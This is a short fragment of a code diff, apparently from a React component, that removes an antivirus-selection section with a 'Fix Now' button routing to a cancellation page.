-                    .replace(/\s+/g, '')
-                    .replace(/[^a-z0-9]/g, '')
-                  setSelectedAntivirus('')
-                  router.push(`/cancel/${target}`)
-                }}
-              >
-                Fix Now &gt;
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
+      </main>
     </>
   )
 }
-
